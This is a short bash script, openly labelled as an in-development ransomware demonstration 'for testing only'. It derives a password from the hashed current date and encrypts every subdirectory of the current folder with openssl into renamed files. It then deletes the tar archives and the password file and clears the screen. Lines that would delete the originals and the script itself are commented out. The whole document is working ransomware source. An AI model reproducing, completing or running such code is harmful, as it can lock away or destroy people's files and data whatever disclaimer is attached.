#/bin/bash

#************USE WITH CAUTION*****************

# The purpose of this script is to understand how a possible malware/ransonware can work .
# This script will encrypt current directory and all its subdirectories.
# This script is to be used for testing only.
# I am not responsible if this script is used for malicious activities. 

# STILL IN DEVELOPMENT



somerandomthing=$( date )

this_thing=$( echo -n $somerandomthing | md5sum | cut -d " " -f1 ) 

echo $this_thing > tempPass.txt




for filename in * ; 
do
	whatfile=$(file $filename | cut -d " " -f2)
	if [ "$whatfile" == "directory" ] ; then
		echo $whatfile
		echo $filename
		echo $this_thing
		tar -vcf $filename.tar $filename
		openssl enc -aes-256-cbc -salt -pass file:tempPass.txt  -in $filename.tar -out SOMETHINGHAPPENED$filename         	
		rm *.tar
		#rm -r $filename
	
	fi
	

done

rm tempPass.txt
clear
		#rm -- $0

